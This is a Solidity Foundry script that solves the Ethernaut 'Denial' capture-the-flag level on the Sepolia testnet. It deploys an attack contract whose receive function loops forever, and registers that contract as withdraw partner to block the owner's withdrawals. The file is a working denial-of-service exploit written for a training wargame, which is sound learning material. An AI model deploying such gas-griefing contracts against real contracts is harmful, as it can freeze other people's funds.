// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Denial.sol";

/*
    Solution script for the Ethernaut Level 20: Denial

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in DenialScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Denial.s.sol:DenialScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Denial.s.sol/11155111
*/

contract DenialAttack {
    // receive function consumes all the gas which prevents the owner from 
    // calling withdraw on the Denial contract
    receive() external payable {
        while (true) {}
    }
}

contract DenialScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x864420E5f34830bA9342C9754bFe31B87a7e9e3c);
    Denial level20 = Denial(instance);

    function run() external {
        vm.startBroadcast();

        DenialAttack attacker = new DenialAttack();
        level20.setWithdrawPartner(address(attacker));

        require(level20.partner() == address(attacker), "Partner not set to attacker contract");

        vm.stopBroadcast();
    }
}